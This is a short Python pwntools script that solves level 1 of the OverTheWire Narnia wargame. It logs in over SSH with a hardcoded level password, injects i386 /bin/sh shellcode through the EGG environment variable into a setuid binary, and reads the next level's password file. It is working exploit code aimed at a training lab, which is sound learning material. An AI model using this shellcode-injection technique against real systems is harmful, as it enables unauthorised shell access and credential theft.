#!/usr/bin/env python
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter

level = 1
user = 'narnia%s' % level
host = 'narnia.labs.overthewire.org'
password = 'efeidiedae'
port = 2226

def connectToLevel():
	return ssh(user=user, host=host, port=port, password=password)

def getPass(shell):
	shell.sendline('cat /etc/narnia_pass/narnia%s' % (level+1))
	flag = shell.recvuntil('$').split()[0]
	log.info('Flag = %s' % flag)
	shell.close()
	return flag

def getCode(shell):
	code = shell.download_data('/narnia/' + user + '.c')
	shell.download_file('/narnia/' + user + '.c')
	log.info('Displaying code momentarily...')
	print highlight(code, CLexer(), TerminalFormatter(bg='dark'))

def makeShellCode():
    return asm(shellcraft.i386.sh())

context(arch='i386', os='linux')
egg = makeShellCode()

sh = connectToLevel()
getCode(sh)
exe = sh.process('/narnia/' + user, env={'EGG':egg})
exe.recvuntil('$')
flag = getPass(exe)
